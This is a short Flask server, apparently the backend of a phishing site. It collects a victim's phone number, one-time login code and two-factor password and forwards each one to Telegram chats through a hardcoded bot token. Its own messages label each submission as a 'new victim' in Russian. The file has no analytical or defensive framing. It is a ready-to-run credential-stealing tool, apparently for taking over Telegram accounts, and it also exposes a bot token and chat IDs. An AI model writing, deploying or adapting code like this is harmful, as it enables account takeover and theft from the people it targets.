from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)

BOT_TOKEN = "7978014372:AAEBsdCAY6rXCnM5qbF_KJ9OLBpw3AiAYg8"
CHAT_IDS = ["1626236089", "5009861049"]

def send_to_tg(message):
    for chat_id in CHAT_IDS:
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": message})
        except:
            pass

HTML = """(вставь HTML из предыдущего сообщения)"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.json.get('phone')
    send_to_tg(f"📞 НОВАЯ ЖЕРТВА\n📱 {phone}\n🌐 IP: {request.remote_addr}")
    return jsonify({'success': True})

@app.route('/api/confirm_code', methods=['POST'])
def confirm_code():
    phone = request.json.get('phone')
    code = request.json.get('code')
    send_to_tg(f"🔑 КОД\n📱 {phone}\n🔢 {code}")
    return jsonify({'need_password': True})

@app.route('/api/confirm_2fa', methods=['POST'])
def confirm_2fa():
    phone = request.json.get('phone')
    password = request.json.get('password')
    send_to_tg(f"🔒 2FA\n📱 {phone}\n🔐 {password}")
    return jsonify({'success': True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
